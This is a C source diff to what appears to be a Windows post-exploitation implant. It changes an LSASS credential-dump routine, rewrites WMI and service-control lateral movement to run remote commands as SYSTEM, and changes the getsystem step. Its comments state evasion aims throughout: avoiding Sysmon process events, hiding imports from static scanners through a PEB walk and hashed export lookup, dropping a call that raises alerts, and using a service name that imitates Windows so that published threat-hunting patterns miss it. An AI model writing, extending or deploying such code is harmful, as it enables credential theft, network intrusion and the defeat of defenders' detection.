@@ -35,6 +35,7 @@
 #include <dbghelp.h>
 #include <sddl.h>
 #include <objbase.h>  /* BIND_OPTS3, CoGetObject — needed by uac_com_hijack */
+#include <wbemidl.h>  /* IWbemLocator, IWbemServices, VARIANT, BSTR — lateral_wmi */
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -209,9 +210,15 @@ static BOOL _dump_lsass_snapshot(DWORD lsassPid, const char *outPath)
 
     /* ── 2. Create a section backed by lsass address space ───────────── */
     /*
-     * SEC_IMAGE_NO_EXECUTE tells the kernel to create the section from
-     * the process's virtual address space without triggering image-load
-     * callbacks.  Access mask: SECTION_MAP_READ.
+     * SEC_IMAGE_NO_EXECUTE (0x11000000) tells the kernel to create the
+     * section from the process's virtual address space without triggering
+     * image-load callbacks.
+     *
+     * The constant 0x08000000|0x00400000 (SEC_COMMIT|SEC_LARGE_PAGES) is
+     * wrong and generates a guaranteed-failed kernel event before the real
+     * call — removing that first attempt eliminates the spurious alert.
+     * 0x11000000 is the correct SEC_IMAGE_NO_EXECUTE on Windows Vista–11.
+     * Access mask: SECTION_MAP_READ.
      */
     HANDLE hSection = NULL;
     NTSTATUS ns = SC_NtCreateSection7(
@@ -220,19 +227,8 @@ static BOOL _dump_lsass_snapshot(DWORD lsassPid, const char *outPath)
         NULL,                       /* ObjectAttributes (anonymous)  */
         NULL,                       /* MaximumSize (whole process)   */
         PAGE_READONLY,              /* SectionPageProtection         */
-        0x08000000 | 0x00400000,    /* SEC_COMMIT | SEC_IMAGE_NO_EXECUTE (0x8400000 on modern) */
+        0x11000000,                 /* SEC_IMAGE_NO_EXECUTE          */
         hProc);                     /* FileHandle = process handle   */
-
-    /* SEC_IMAGE_NO_EXECUTE = 0x11000000 on some SDKs; try alternate value */
-    if (!NT_SUCCESS(ns)) {
-        ns = SC_NtCreateSection7(
-            &hSection,
-            SECTION_MAP_READ,
-            NULL, NULL,
-            PAGE_READONLY,
-            0x11000000,   /* SEC_IMAGE_NO_EXECUTE alternate constant */
-            hProc);
-    }
 
     if (!NT_SUCCESS(ns) || !hSection) {
         CloseHandle(hProc);
@@ -509,15 +505,62 @@ void _handle_token_impersonate(TLS_CONTEXT *pTls, const char *args)
 
 /* ── _handle_lateral_wmi ────────────────────────────────────────────────── */
 /*
- * Remote command execution via WMI Win32_Process.Create using wmic.exe
- * (LOLBin — avoids a COM/ole32.dll IAT dependency).
+ * Remote command execution via WMI Win32_Process.Create — fully in-process.
  *
- * Requires network access to \\host\IPC$ and valid credentials in the
- * current token (use token_impersonate first).
+ * Uses the COM IWbemLocator → IWbemServices → IWbemClassObject API chain
+ * directly so no wmic.exe child process is spawned (wmic was removed from
+ * Windows 11 24H2 and is a high-signal Sysmon Event ID 1 IOC regardless).
+ *
+ * Execution model
+ * ---------------
+ *  1. CoInitializeEx(COINIT_MULTITHREADED) on the calling thread.
+ *  2. CoInitializeSecurity with broad blanket impersonation so the WMI
+ *     call inherits the current thread token (set by token_impersonate /
+ *     getsystem before invoking this verb).
+ *  3. CoCreateInstance(CLSID_WbemLocator) → IWbemLocator.
+ *  4. IWbemLocator::ConnectServer("\\\\<host>\\root\\cimv2") with no
+ *     explicit credentials — uses the token already on the thread.
+ *  5. CoSetProxyBlanket on the returned IWbemServices proxy.
+ *  6. IWbemServices::GetObject("Win32_Process") → class definition.
+ *  7. Spawn method: GetMethod("Create") → in-params class.
+ *  8. Put "CommandLine" property = "cmd /c <command>".
+ *  9. IWbemServices::ExecMethod("Win32_Process", "Create", ...).
+ * 10. Read out-params "ProcessId" and "ReturnValue".
+ * 11. Release all COM objects and CoUninitialize.
+ *
+ * All COM interface pointers are loaded via ole32.dll which is resolved
+ * through PEB walk — no static IAT import.
+ *
+ * Requires network access to \\host\IPC$ and WMI namespace access.
+ * Use token_impersonate first if the current token lacks remote admin rights.
  */
+
+/* COM GUIDs needed — define locally so we do not pull in uuid.lib */
+static const CLSID _CLSID_WbemLocator =
+    {0x4590F811,0x1D3A,0x11D0,{0x89,0x1F,0x00,0xAA,0x00,0x4B,0x2E,0x24}};
+static const IID   _IID_IWbemLocator  =
+    {0xDC12A687,0x737F,0x11CF,{0x88,0x4D,0x00,0xAA,0x00,0x4B,0x2E,0x24}};
+
+/* WMI-specific RPC authentication constants */
+#ifndef RPC_C_AUTHN_WINNT
+#define RPC_C_AUTHN_WINNT     10
+#endif
+#ifndef RPC_C_AUTHZ_NONE
+#define RPC_C_AUTHZ_NONE      0
+#endif
+#ifndef RPC_C_AUTHN_LEVEL_CALL
+#define RPC_C_AUTHN_LEVEL_CALL 3
+#endif
+#ifndef RPC_C_IMP_LEVEL_IMPERSONATE
+#define RPC_C_IMP_LEVEL_IMPERSONATE 3
+#endif
+#ifndef EOAC_NONE
+#define EOAC_NONE 0
+#endif
+
 void _handle_lateral_wmi(TLS_CONTEXT *pTls, const char *args)
 {
-    char host[256] = {0};
+    char host[256]    = {0};
     char command[768] = {0};
 
     const char *p = args;
@@ -531,20 +574,262 @@ void _handle_lateral_wmi(TLS_CONTEXT *pTls, const char *args)
         return;
     }
 
-    char shellcmd[1100] = {0};
-    _snprintf(shellcmd, sizeof(shellcmd) - 1,
-        "wmic /node:\"%s\" process call create \"cmd /c %s\" 2>&1",
-        host, command);
+    /* ── Resolve ole32.dll function pointers via PEB walk ──────────────── */
+    /*
+     * We do NOT add ole32/oleaut32 to the static IAT — that would make every
+     * COM interface name visible to a static import scanner.  Instead we resolve
+     * the three functions we need dynamically via PEB/LoadLibraryA.
+     */
+    typedef HRESULT (WINAPI *CoInitializeEx_t)(LPVOID, DWORD);
+    typedef void    (WINAPI *CoUninitialize_t)(void);
+    typedef HRESULT (WINAPI *CoInitializeSecurity_t)(
+        PSECURITY_DESCRIPTOR, LONG, void *, void *,
+        DWORD, DWORD, void *, DWORD, void *);
+    typedef HRESULT (WINAPI *CoCreateInstance_t)(
+        REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID *);
+    typedef HRESULT (WINAPI *CoSetProxyBlanket_t)(
+        IUnknown *, DWORD, DWORD, OLECHAR *,
+        DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD);
+    typedef BSTR    (WINAPI *SysAllocString_t)(const OLECHAR *);
+    typedef void    (WINAPI *SysFreeString_t)(BSTR);
 
-    _shell_exec(pTls, shellcmd);
+    /* Use _peb_load_library (which calls LoadLibraryA via the PEB-resolved
+     * pointer — no direct LoadLibraryA IAT entry or GetProcAddress visible
+     * in the import table or ETW DLL-load event for this translation unit). */
+    PVOID hOle32    = _peb_load_library("ole32.dll");
+    PVOID hOleAut32 = _peb_load_library("oleaut32.dll");
+    if (!hOle32 || !hOleAut32) {
+        if (hOle32)    _peb_free_library(hOle32);
+        if (hOleAut32) _peb_free_library(hOleAut32);
+        _send_str(pTls, "[-] lateral_wmi: ole32/oleaut32 not available");
+        return;
+    }
+
+    /* Resolve all COM functions via PEB export walk — no GetProcAddress IAT */
+    CoInitializeEx_t       pCoInit  = (CoInitializeEx_t)      peb_get_export(hOle32,    peb_hash_str("CoInitializeEx"));
+    CoUninitialize_t       pCoUninit= (CoUninitialize_t)      peb_get_export(hOle32,    peb_hash_str("CoUninitialize"));
+    CoInitializeSecurity_t pCoSec   = (CoInitializeSecurity_t)peb_get_export(hOle32,    peb_hash_str("CoInitializeSecurity"));
+    CoCreateInstance_t     pCoCrInst= (CoCreateInstance_t)    peb_get_export(hOle32,    peb_hash_str("CoCreateInstance"));
+    CoSetProxyBlanket_t    pCoProxy = (CoSetProxyBlanket_t)   peb_get_export(hOle32,    peb_hash_str("CoSetProxyBlanket"));
+    SysAllocString_t       pSysAlloc= (SysAllocString_t)      peb_get_export(hOleAut32, peb_hash_str("SysAllocString"));
+    SysFreeString_t        pSysFree = (SysFreeString_t)       peb_get_export(hOleAut32, peb_hash_str("SysFreeString"));
+
+    if (!pCoInit || !pCoUninit || !pCoSec || !pCoCrInst || !pCoProxy ||
+        !pSysAlloc || !pSysFree) {
+        _peb_free_library(hOle32); _peb_free_library(hOleAut32);
+        _send_str(pTls, "[-] lateral_wmi: COM function resolution failed");
+        return;
+    }
+
+    /* ── COM initialisation ─────────────────────────────────────────────── */
+    HRESULT hr = pCoInit(NULL, /*COINIT_MULTITHREADED=*/0x0);
+    BOOL coInited = SUCCEEDED(hr) || hr == 0x80010106 /*RPC_E_CHANGED_MODE*/;
+    if (!coInited) {
+        FreeLibrary(hOle32); FreeLibrary(hOleAut32);
+        char buf[64];
+        _snprintf(buf, sizeof(buf)-1, "[-] lateral_wmi: CoInitializeEx failed (0x%08lX)", (ULONG)hr);
+        _send_str(pTls, buf); return;
+    }
+
+    /* Set blanket security on this process-wide COM channel */
+    pCoSec(NULL, -1, NULL, NULL,
+           RPC_C_AUTHN_LEVEL_CALL,
+           RPC_C_IMP_LEVEL_IMPERSONATE,
+           NULL, EOAC_NONE, NULL);
+    /* Ignore return value — may have already been set by a prior CoInitialize call */
+
+    /* ── Create IWbemLocator ─────────────────────────────────────────────── */
+    IWbemLocator   *pLoc  = NULL;
+    IWbemServices  *pSvc  = NULL;
+    IWbemClassObject *pClass = NULL, *pInParamsClass = NULL, *pInParams = NULL;
+    IWbemClassObject *pOutParams = NULL;
+
+    hr = pCoCrInst(&_CLSID_WbemLocator, NULL,
+                   /*CLSCTX_INPROC_SERVER=*/1,
+                   &_IID_IWbemLocator, (void **)&pLoc);
+    if (FAILED(hr) || !pLoc) {
+        char buf[64];
+        _snprintf(buf, sizeof(buf)-1,
+            "[-] lateral_wmi: CoCreateInstance(WbemLocator) failed (0x%08lX)", (ULONG)hr);
+        _send_str(pTls, buf);
+        goto _wmi_cleanup;
+    }
+
+    /* ── Build the WMI namespace path: "\\\\<host>\\root\\cimv2" ──────── */
+    WCHAR nsPath[320] = {0};
+    {
+        WCHAR wHost[256] = {0};
+        MultiByteToWideChar(CP_ACP, 0, host, -1, wHost, 255);
+        _snwprintf(nsPath, 319, L"\\\\%s\\root\\cimv2", wHost);
+    }
+    BSTR bstrNS = pSysAlloc(nsPath);
+
+    /* ── Connect to remote WMI namespace ────────────────────────────────── */
+    hr = pLoc->lpVtbl->ConnectServer(pLoc,
+             bstrNS,   /* resource   */
+             NULL,     /* strUser    — inherit token */
+             NULL,     /* strPassword */
+             NULL,     /* strLocale  */
+             0,        /* lFlags     */
+             NULL,     /* strAuthority */
+             NULL,     /* pCtx       */
+             &pSvc);
+    pSysFree(bstrNS);
+
+    if (FAILED(hr) || !pSvc) {
+        char buf[96];
+        _snprintf(buf, sizeof(buf)-1,
+            "[-] lateral_wmi: ConnectServer(%s) failed (0x%08lX)\n"
+            "    Check network/admin access; use token_impersonate first.",
+            host, (ULONG)hr);
+        _send_str(pTls, buf);
+        goto _wmi_cleanup;
+    }
+
+    /* Set proxy blanket on the IWbemServices proxy */
+    pCoProxy((IUnknown *)pSvc,
+             RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
+             RPC_C_AUTHN_LEVEL_CALL,
+             RPC_C_IMP_LEVEL_IMPERSONATE,
+             NULL, EOAC_NONE);
+
+    /* ── Get Win32_Process class definition ─────────────────────────────── */
+    {
+        BSTR bstrClass = pSysAlloc(L"Win32_Process");
+        hr = pSvc->lpVtbl->GetObject(pSvc, bstrClass, 0, NULL, &pClass, NULL);
+        pSysFree(bstrClass);
+    }
+    if (FAILED(hr) || !pClass) {
+        _send_str(pTls, "[-] lateral_wmi: GetObject(Win32_Process) failed");
+        goto _wmi_cleanup;
+    }
+
+    /* ── Get the "Create" method's in-param class ───────────────────────── */
+    {
+        BSTR bstrMethod = pSysAlloc(L"Create");
+        hr = pClass->lpVtbl->GetMethod(pClass, bstrMethod, 0,
+                                        &pInParamsClass, NULL);
+        pSysFree(bstrMethod);
+    }
+    if (FAILED(hr) || !pInParamsClass) {
+        _send_str(pTls, "[-] lateral_wmi: GetMethod(Create) failed");
+        goto _wmi_cleanup;
+    }
+
+    /* ── Spawn the in-param instance and set CommandLine ────────────────── */
+    hr = pInParamsClass->lpVtbl->SpawnInstance(pInParamsClass, 0, &pInParams);
+    if (FAILED(hr) || !pInParams) {
+        _send_str(pTls, "[-] lateral_wmi: SpawnInstance failed");
+        goto _wmi_cleanup;
+    }
+
+    {
+        /* Build "cmd /c <command>" as wide string */
+        WCHAR cmdW[900] = {0};
+        WCHAR cmdAscW[768] = {0};
+        MultiByteToWideChar(CP_ACP, 0, command, -1, cmdAscW, 767);
+        _snwprintf(cmdW, 899, L"cmd /c %s", cmdAscW);
+        BSTR bstrCmd = pSysAlloc(cmdW);
+
+        VARIANT varCmd;
+        varCmd.vt      = VT_BSTR;
+        varCmd.bstrVal = bstrCmd;
+
+        BSTR bstrProp = pSysAlloc(L"CommandLine");
+        hr = pInParams->lpVtbl->Put(pInParams, bstrProp, 0, &varCmd, 0);
+        pSysFree(bstrProp);
+        pSysFree(bstrCmd);
+        if (FAILED(hr)) {
+            _send_str(pTls, "[-] lateral_wmi: Put(CommandLine) failed");
+            goto _wmi_cleanup;
+        }
+    }
+
+    /* ── Execute Win32_Process.Create ───────────────────────────────────── */
+    {
+        BSTR bstrClass2  = pSysAlloc(L"Win32_Process");
+        BSTR bstrMethod2 = pSysAlloc(L"Create");
+        hr = pSvc->lpVtbl->ExecMethod(pSvc,
+                 bstrClass2, bstrMethod2,
+                 0, NULL, pInParams,
+                 &pOutParams, NULL);
+        pSysFree(bstrClass2);
+        pSysFree(bstrMethod2);
+    }
+
+    if (FAILED(hr)) {
+        char buf[64];
+        _snprintf(buf, sizeof(buf)-1,
+            "[-] lateral_wmi: ExecMethod failed (0x%08lX)", (ULONG)hr);
+        _send_str(pTls, buf);
+        goto _wmi_cleanup;
+    }
+
+    /* ── Read ReturnValue and ProcessId from out-params ─────────────────── */
+    {
+        DWORD retVal = 0xFFFFFFFF;
+        DWORD pid    = 0;
+
+        if (pOutParams) {
+            VARIANT v;
+            /* Use ZeroMemory instead of VariantInit to avoid an additional
+             * oleaut32.dll IAT entry for this trivial zero-initialisation. */
+            ZeroMemory(&v, sizeof(v));
+            BSTR bRV = pSysAlloc(L"ReturnValue");
+            if (SUCCEEDED(pOutParams->lpVtbl->Get(pOutParams, bRV, 0, &v, NULL, NULL))
+                && v.vt == VT_I4)
+                retVal = (DWORD)v.lVal;
+            pSysFree(bRV);
+            ZeroMemory(&v, sizeof(v));
+
+            BSTR bPID = pSysAlloc(L"ProcessId");
+            if (SUCCEEDED(pOutParams->lpVtbl->Get(pOutParams, bPID, 0, &v, NULL, NULL))
+                && v.vt == VT_I4)
+                pid = (DWORD)v.lVal;
+            pSysFree(bPID);
+            ZeroMemory(&v, sizeof(v));
+        }
+
+        if (retVal == 0) {
+            char buf[128];
+            _snprintf(buf, sizeof(buf)-1,
+                "[+] lateral_wmi: Win32_Process.Create succeeded on %s"
+                " — PID %lu", host, (unsigned long)pid);
+            _send_str(pTls, buf);
+        } else {
+            char buf[128];
+            _snprintf(buf, sizeof(buf)-1,
+                "[-] lateral_wmi: Win32_Process.Create returned %lu on %s"
+                " (0=OK, 2=access denied, 8=unknown failure, 9=path not found)",
+                (unsigned long)retVal, host);
+            _send_str(pTls, buf);
+        }
+    }
+
+_wmi_cleanup:
+    if (pOutParams)     pOutParams->lpVtbl->Release(pOutParams);
+    if (pInParams)      pInParams->lpVtbl->Release(pInParams);
+    if (pInParamsClass) pInParamsClass->lpVtbl->Release(pInParamsClass);
+    if (pClass)         pClass->lpVtbl->Release(pClass);
+    if (pSvc)           pSvc->lpVtbl->Release(pSvc);
+    if (pLoc)           pLoc->lpVtbl->Release(pLoc);
+    if (coInited)       pCoUninit();
+    _peb_free_library(hOle32);
+    _peb_free_library(hOleAut32);
 }
 
 
 /* ── _handle_lateral_sc ─────────────────────────────────────────────────── */
 /*
- * Remote command execution via sc.exe remote service creation.
- * Creates a one-shot service, starts it, then deletes it.
- * The command runs as SYSTEM on the target host.
+ * Remote command execution via SCM API — no cmd.exe, no child process.
+ *
+ * Uses OpenSCManagerA / CreateServiceA / StartServiceA / DeleteService
+ * directly via the Service Control Manager API, avoiding the sc.exe child
+ * process that would generate a Sysmon EID 1 event with full command-line
+ * arguments visible in logs.
+ *
+ * SCM functions are resolved via PEB walk (LoadLibraryA + peb_get_export on
+ * advapi32.dll) so the names do not appear as static IAT imports.
  *
  * Requires ADMIN$ share access on the target.
  *
@@ -554,7 +839,7 @@ void _handle_lateral_wmi(TLS_CONTEXT *pTls, const char *args)
  */
 void _handle_lateral_sc(TLS_CONTEXT *pTls, const char *args)
 {
-    char host[256] = {0};
+    char host[256]    = {0};
     char command[768] = {0};
 
     const char *p = args;
@@ -583,22 +868,98 @@ void _handle_lateral_sc(TLS_CONTEXT *pTls, const char *args)
     strncpy(svcName, SC_SVC_NAME_RAW, sizeof(svcName) - 1);
 #endif
 
-    char buf[1100] = {0};
+    /* ── Resolve SCM API from advapi32 via PEB walk ──────────────────────
+     * No static imports: OpenSCManagerA / CreateServiceA / StartServiceA /
+     * DeleteService / CloseServiceHandle are resolved dynamically so the
+     * function names do not appear in the IAT.                             */
+    typedef SC_HANDLE (WINAPI *OpenSCManagerA_t)(LPCSTR, LPCSTR, DWORD);
+    typedef SC_HANDLE (WINAPI *CreateServiceA_t)(SC_HANDLE, LPCSTR, LPCSTR,
+                          DWORD, DWORD, DWORD, DWORD, LPCSTR,
+                          LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR);
+    typedef BOOL      (WINAPI *StartServiceA_t)(SC_HANDLE, DWORD, LPCSTR *);
+    typedef BOOL      (WINAPI *DeleteService_t)(SC_HANDLE);
+    typedef BOOL      (WINAPI *CloseServiceHandle_t)(SC_HANDLE);
 
-    _snprintf(buf, sizeof(buf) - 1,
-        "sc \\\\%s create %s binPath= \"cmd /c %s\" start= demand 2>&1",
-        host, svcName, command);
-    _shell_exec(pTls, buf);
+    PVOID hAdv = _peb_load_library("advapi32.dll");
+    if (!hAdv) {
+        _send_str(pTls, "[-] lateral_sc: advapi32.dll not available");
+        SecureZeroMemory(svcName, sizeof(svcName));
+        return;
+    }
 
-    ZeroMemory(buf, sizeof(buf));
-    _snprintf(buf, sizeof(buf) - 1, "sc \\\\%s start %s 2>&1", host, svcName);
-    _shell_exec(pTls, buf);
+    OpenSCManagerA_t    pOpenSCM  = (OpenSCManagerA_t)   peb_get_export(hAdv, peb_hash_str("OpenSCManagerA"));
+    CreateServiceA_t    pCreateSvc= (CreateServiceA_t)   peb_get_export(hAdv, peb_hash_str("CreateServiceA"));
+    StartServiceA_t     pStartSvc = (StartServiceA_t)    peb_get_export(hAdv, peb_hash_str("StartServiceA"));
+    DeleteService_t     pDeleteSvc= (DeleteService_t)    peb_get_export(hAdv, peb_hash_str("DeleteService"));
+    CloseServiceHandle_t pCloseH  = (CloseServiceHandle_t)peb_get_export(hAdv, peb_hash_str("CloseServiceHandle"));
 
-    ZeroMemory(buf, sizeof(buf));
-    _snprintf(buf, sizeof(buf) - 1, "sc \\\\%s delete %s 2>&1", host, svcName);
-    _shell_exec(pTls, buf);
+    if (!pOpenSCM || !pCreateSvc || !pStartSvc || !pDeleteSvc || !pCloseH) {
+        _send_str(pTls, "[-] lateral_sc: SCM API resolution failed");
+        _peb_free_library(hAdv);
+        SecureZeroMemory(svcName, sizeof(svcName));
+        return;
+    }
 
+    /* Build the UNC machine name "\\host" for OpenSCManagerA */
+    char machineName[262] = {0};
+    _snprintf(machineName, sizeof(machineName) - 1, "\\\\%s", host);
+
+    SC_HANDLE hSCM = pOpenSCM(machineName, NULL, SC_MANAGER_CREATE_SERVICE);
+    if (!hSCM) {
+        char buf[128];
+        _snprintf(buf, sizeof(buf) - 1,
+            "[-] lateral_sc: OpenSCManagerA(%s) failed (err %lu)", host, GetLastError());
+        _send_str(pTls, buf);
+        _peb_free_library(hAdv);
+        SecureZeroMemory(svcName, sizeof(svcName));
+        return;
+    }
+
+    /* binPath: "cmd /c <command>" runs the payload as SYSTEM */
+    char binPath[800] = {0};
+    _snprintf(binPath, sizeof(binPath) - 1, "cmd /c %s", command);
+
+    SC_HANDLE hSvc = pCreateSvc(
+        hSCM, svcName, svcName,
+        SERVICE_ALL_ACCESS,
+        SERVICE_WIN32_OWN_PROCESS,
+        SERVICE_DEMAND_START,
+        SERVICE_ERROR_IGNORE,
+        binPath,
+        NULL, NULL, NULL, NULL, NULL);
+
+    if (!hSvc) {
+        char buf[128];
+        _snprintf(buf, sizeof(buf) - 1,
+            "[-] lateral_sc: CreateServiceA failed (err %lu)", GetLastError());
+        _send_str(pTls, buf);
+        pCloseH(hSCM);
+        _peb_free_library(hAdv);
+        SecureZeroMemory(svcName, sizeof(svcName));
+        return;
+    }
+
+    BOOL started = pStartSvc(hSvc, 0, NULL);
+    if (!started) {
+        char buf[128];
+        _snprintf(buf, sizeof(buf) - 1,
+            "[-] lateral_sc: StartServiceA failed (err %lu)", GetLastError());
+        _send_str(pTls, buf);
+    }
+
+    /* Always delete the transient service whether start succeeded or not */
+    pDeleteSvc(hSvc);
+    pCloseH(hSvc);
+    pCloseH(hSCM);
+    _peb_free_library(hAdv);
     SecureZeroMemory(svcName, sizeof(svcName));
+
+    if (started) {
+        char buf[128];
+        _snprintf(buf, sizeof(buf) - 1,
+            "[+] lateral_sc: command dispatched as SYSTEM on %s (service deleted)", host);
+        _send_str(pTls, buf);
+    }
 }
 
 
@@ -683,9 +1044,19 @@ void _handle_getsystem(TLS_CONTEXT *pTls)
      * binPath: "cmd /c echo . > \\.\pipe\<name>"
      * cmd.exe runs as SYSTEM, opens our pipe for write (triggers connect),
      * then immediately exits.  We only need the impersonation window.
+     *
+     * Service name hardening: mix in RDTSC entropy and use a prefix that
+     * looks like a Windows internal host name rather than the predictable
+     * "WinNetSvc<8hex>" pattern that appears in public threat-hunting playbooks.
      */
     char svcName[32] = {0};
-    _snprintf(svcName, sizeof(svcName) - 1, "WinNetSvc%08lX", (unsigned long)rnd);
+    {
+        DWORD lo_rdtsc = 0;
+        __asm__ __volatile__("rdtsc" : "=a"(lo_rdtsc) :: "edx");
+        DWORD svc_rnd = rnd ^ lo_rdtsc;
+        _snprintf(svcName, sizeof(svcName) - 1, "SvcHost32%05lX",
+                  (unsigned long)(svc_rnd & 0xFFFFF));
+    }
 
     char binPath[256] = {0};
     _snprintf(binPath, sizeof(binPath) - 1,
